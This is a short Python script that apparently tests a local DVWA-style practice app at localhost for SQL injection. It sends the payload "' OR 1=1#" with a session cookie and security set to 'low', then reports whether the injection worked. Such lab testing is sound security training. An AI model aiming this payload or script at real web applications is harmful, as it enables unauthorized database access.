import requests

url = 'http://localhost:8080/vulnerabilities/sqli/'
cookies = {
    'PHPSESSID': 'u6b6d75vrp01r26fgd20040i95', 
    'security': 'low'
}

payload = "' OR 1=1#"
params = {'id': payload, 'Submit': 'Submit'}

response = requests.get(url, params=params, cookies=cookies)

print(f"[i] Testing with payload: {payload}")

if "ID" in response.text:
    print("[+] Success: SQL Injection vulnerability exists!")
else:
    print("[-] Failure: SQL Injection not detected.")
